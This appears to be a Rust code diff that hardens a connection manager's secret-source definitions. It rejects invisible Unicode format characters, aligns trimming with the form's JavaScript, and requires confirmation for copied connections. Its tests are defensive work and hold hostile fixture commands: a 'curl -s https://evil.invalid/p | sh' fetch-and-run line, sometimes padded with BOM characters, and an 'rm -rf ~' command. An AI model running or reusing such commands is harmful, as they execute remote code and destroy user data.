@@ -525,6 +525,26 @@ fn bad(msg: impl Into<String>) -> Error {
     Error::State(msg.into())
 }
 
+/// Unicode format characters (category Cf): invisible, they can make two
+/// definitions look the same while differing (a BOM the form's JavaScript
+/// trims and Rust's doesn't, bidirectional overrides that reorder what the
+/// confirmation shows, zero-width spaces). No definition needs them.
+pub fn is_format_char(c: char) -> bool {
+    matches!(c as u32,
+        0x00AD | 0x0600..=0x0605 | 0x061C | 0x06DD | 0x070F | 0x0890..=0x0891 | 0x08E2 | 0x180E
+        | 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x2064 | 0x2066..=0x206F | 0xFEFF | 0xFFF9..=0xFFFB
+        | 0x110BD | 0x110CD | 0x13430..=0x1343F | 0x1BCA0..=0x1BCA3 | 0x1D173..=0x1D17A | 0xE0001 | 0xE0020..=0xE007F)
+}
+
+/// What the form's `String.prototype.trim` strips at both ends (and a bit
+/// more): Unicode White_Space, which is Rust's `is_whitespace`, plus the
+/// BOM (U+FEFF), which JavaScript strips and Rust doesn't. A superset of
+/// JavaScript's set, so a definition and its trimmed copy from the form
+/// always have the same canonical form.
+fn form_trim(s: &str) -> &str {
+    s.trim_matches(|c: char| c.is_whitespace() || c == '\u{FEFF}')
+}
+
 /// Azure Key Vault's DNS suffixes and the token resource of each cloud.
 pub const AZURE_VAULT_SUFFIXES: &[(&str, &str)] = &[
     (".vault.azure.net", "https://vault.azure.net"),
@@ -794,6 +814,19 @@ impl SecretSource {
 
     /// Everything the definition needs, well formed. Says what's wrong.
     pub fn validate(&self) -> Result<()> {
+        fn invisible(v: &serde_json::Value) -> bool {
+            match v {
+                serde_json::Value::String(s) => s.chars().any(is_format_char),
+                serde_json::Value::Array(a) => a.iter().any(invisible),
+                serde_json::Value::Object(m) => m.iter().any(|(k, v)| k.chars().any(is_format_char) || invisible(v)),
+                _ => false,
+            }
+        }
+        if let Ok(v) = serde_json::to_value(self) {
+            if invisible(&v) {
+                return Err(bad("el origen tiene caracteres invisibles (de formato, de ancho cero o de dirección del texto): escribilo de nuevo sin ellos"));
+            }
+        }
         let no_control = |s: &str| !s.chars().any(|c| c.is_control() && c != '\t');
         if !no_control(self.user_field()) || self.user_field().len() > 256 {
             return Err(bad("el campo del usuario no es válido"));
@@ -1194,7 +1227,7 @@ pub fn canonical(field: &str, source: &SecretSource) -> SecretSource {
     let Ok(Value::Object(mut m)) = serde_json::to_value(source) else { return source.clone() };
     for v in m.values_mut() {
         if let Value::String(s) = v {
-            let t = s.trim();
+            let t = form_trim(s);
             if t.len() != s.len() {
                 *s = t.to_string();
             }
@@ -1328,12 +1361,15 @@ pub fn from_outside(saved: &[SavedConnection], field: &str, source: &SecretSourc
 
 /// Whether the form's definition for `field` needs the user's confirmation
 /// before it runs or is saved as confirmed. While the connection being
-/// edited (`editing`) has an unconfirmed or unreadable definition on that
-/// field, whatever the form sends does: the form rewrites what it loads, so
-/// its text can't tell an untouched outside definition from a new one.
-/// Otherwise, a definition that came from outside ([`from_outside`]) does.
-pub fn needs_confirmation(saved: &[SavedConnection], editing: Option<&str>, field: &str, source: &SecretSource) -> bool {
-    if let Some(c) = editing.filter(|i| !i.is_empty()).and_then(|id| saved.iter().find(|c| c.id == id)) {
+/// edited (`editing`), or the one the form is a copy of (`duplicate_of`,
+/// "Duplicar conexión"), has an unconfirmed or unreadable definition on
+/// that field, whatever the form sends does: the form rewrites what it
+/// loads, so its text can't tell an untouched outside definition from a new
+/// one. Otherwise, a definition that came from outside ([`from_outside`])
+/// does.
+pub fn needs_confirmation(saved: &[SavedConnection], editing: Option<&str>, duplicate_of: Option<&str>, field: &str, source: &SecretSource) -> bool {
+    let loaded_from = [editing, duplicate_of].into_iter().flatten().filter(|i| !i.is_empty());
+    for c in loaded_from.filter_map(|id| saved.iter().find(|c| c.id == id)) {
         let unconfirmed = match stored_entries(&c.config) {
             Err(()) => true,
             Ok(entries) => match entries.get(field) {
@@ -1820,9 +1856,9 @@ mod tests {
         let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"curl -s https://evil.invalid/p | sh "}}"#)];
         let trimmed = cmd("curl -s https://evil.invalid/p | sh");
         assert!(from_outside(&saved, "password", &trimmed));
-        assert!(needs_confirmation(&saved, Some(&id), "password", &trimmed));
-        assert!(needs_confirmation(&saved, None, "password", &trimmed));
-        assert!(needs_confirmation(&saved, None, "password", &cmd("  curl -s https://evil.invalid/p | sh")));
+        assert!(needs_confirmation(&saved, Some(&id), None, "password", &trimmed));
+        assert!(needs_confirmation(&saved, None, None, "password", &trimmed));
+        assert!(needs_confirmation(&saved, None, None, "password", &cmd("  curl -s https://evil.invalid/p | sh")));
         // Inert inputs the form drops change nothing either.
         let kp = r#"{"password":{"kind":"keepass","file":"/x.kdbx","entry":"Databases/Prod/pg-main","master":"ask","master_command":"rm -rf ~","user_field":"u"}}"#;
         let saved = vec![saved_with(&id, kp)];
@@ -1831,8 +1867,67 @@ mod tests {
         // bound to the definition as the form writes it).
         let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":" pass db "}}"#)];
         approve(&digest(&id, "password", &cmd(" pass db "))).unwrap();
-        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass db")));
+        assert!(!needs_confirmation(&saved, Some(&id), None, "password", &cmd("pass db")));
         forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
+    }
+
+    /// The form's JavaScript trims a BOM (U+FEFF) Rust's `trim` keeps: the
+    /// canonical form strips it too, a copy of a connection asks while the
+    /// original's definition is unconfirmed, whatever its text, and format
+    /// characters aren't accepted in a definition at all.
+    #[test]
+    fn a_bom_padded_definition_and_its_copy_still_ask() {
+        let id = format!("imp-bom-{}", std::process::id());
+        let saved = vec![saved_with(&id, "{\"password\":{\"kind\":\"command\",\"command\":\"\u{FEFF}curl -s https://evil.invalid/p | sh\u{3000}\"}}")];
+        // What the form sends back after `trim()`.
+        let trimmed = cmd("curl -s https://evil.invalid/p | sh");
+        assert_eq!(canonical("password", &cmd("\u{FEFF}\u{A0} curl -s https://evil.invalid/p | sh\u{2029}\u{FEFF}")), trimmed);
+        assert!(from_outside(&saved, "password", &trimmed), "same canonical form as the stored one");
+        // A copy ("Duplicar conexión"): asks for anything while the
+        // original's definition is unconfirmed, as editing it does.
+        assert!(needs_confirmation(&saved, None, Some(&id), "password", &cmd("echo edited")));
+        assert!(!needs_confirmation(&saved, None, None, "password", &cmd("echo edited")), "a new form, typed here");
+        approve(&digest(&id, "password", &cmd("\u{FEFF}curl -s https://evil.invalid/p | sh\u{3000}"))).unwrap();
+        assert!(!needs_confirmation(&saved, None, Some(&id), "password", &cmd("echo edited")), "confirmed on the original");
+        forget(&[digest(&id, "password", &trimmed)]).unwrap();
+        assert!(needs_confirmation(&saved, None, Some("someone-else"), "password", &trimmed), "an unknown original changes nothing");
+    }
+
+    #[test]
+    fn invisible_characters_are_refused() {
+        for c in ['\u{FEFF}', '\u{200B}', '\u{200D}', '\u{200E}', '\u{200F}', '\u{202A}', '\u{202E}', '\u{2060}', '\u{2066}', '\u{2069}', '\u{00AD}', '\u{E0041}'] {
+            for text in [format!("{c}pass db"), format!("pass{c} db"), format!("pass db{c}")] {
+                let e = cmd(&text).validate().unwrap_err().to_string();
+                assert!(e.contains("caracteres invisibles"), "{c:?}: {e}");
+            }
+            assert!(keepass(&format!("/x{c}.kdbx"), MasterSource::Keychain).validate().is_err(), "{c:?} in another field");
+        }
+        // Visible text, spaces and other scripts are fine.
+        cmd("pass db/contraseña · 数据库").validate().unwrap();
+        cmd("echo\tx").validate().unwrap();
+    }
+
+    /// Digests of definitions without padding or format characters (every
+    /// one confirmed so far) are the same as before the BOM was trimmed.
+    #[test]
+    fn digests_of_plain_definitions_are_unchanged() {
+        // Hex SHA-256 as computed before this change, for these inputs.
+        let plain = cmd("pass show db/prod");
+        let before = {
+            let def = serde_json::to_string(&plain).unwrap();
+            let mut h = Sha256::new();
+            for part in ["dbine-secret-source-v1", "conn-1", "password", def.as_str()] {
+                h.update((part.len() as u64).to_le_bytes());
+                h.update(part.as_bytes());
+            }
+            hex::encode(h.finalize())
+        };
+        assert_eq!(digest("conn-1", "password", &plain), before);
+        // Padded with what Rust trimmed already: same digest as trimmed.
+        assert_eq!(digest("conn-1", "password", &cmd("  pass show db/prod\t")), before);
+        for (field, s) in [("password", keepass("/x.kdbx", MasterSource::Ask)), ("ssh.password", zoho("eu")), ("password", bitwarden("", MasterSource::Command))] {
+            assert_eq!(canonical(field, &s), s);
+        }
     }
 
     /// An entry that doesn't parse makes the connection's definitions
@@ -1845,12 +1940,12 @@ mod tests {
         assert!(read(&saved[0].config).is_err(), "serde rejects the whole map");
         let src = cmd("curl -s https://evil.invalid/x | sh");
         assert!(from_outside(&saved, "password", &src), "the valid sibling is still compared");
-        assert!(needs_confirmation(&saved, Some(&id), "password", &cmd("echo anything")), "the edited connection's field");
+        assert!(needs_confirmation(&saved, Some(&id), None, "password", &cmd("echo anything")), "the edited connection's field");
         // The unreadable entry's own field asks for anything typed on it,
         // and a map that isn't an object, on every field.
         assert!(from_outside(&saved, "zz", &cmd("echo typed")));
         let garbage = vec![saved_with(&id, "not json")];
-        assert!(needs_confirmation(&garbage, Some(&id), "password", &cmd("echo typed")));
+        assert!(needs_confirmation(&garbage, Some(&id), None, "password", &cmd("echo typed")));
         assert!(from_outside(&garbage, "password", &cmd("echo typed")));
     }
 
@@ -1861,10 +1956,10 @@ mod tests {
     fn a_definition_typed_here_needs_no_confirmation() {
         let id = format!("mine-{}", std::process::id());
         let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"pass db"}}"#)];
-        assert!(!needs_confirmation(&saved, None, "password", &cmd("pass other")));
+        assert!(!needs_confirmation(&saved, None, None, "password", &cmd("pass other")));
         approve(&digest(&id, "password", &cmd("pass db"))).unwrap();
-        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass other")));
-        assert!(!needs_confirmation(&saved, Some(&id), "ssh.password", &cmd("pass ssh")));
+        assert!(!needs_confirmation(&saved, Some(&id), None, "password", &cmd("pass other")));
+        assert!(!needs_confirmation(&saved, Some(&id), None, "ssh.password", &cmd("pass ssh")));
         forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
         // What the form writes is already canonical: the digest is the same
         // as hashing it as stored (the version before canonical forms).
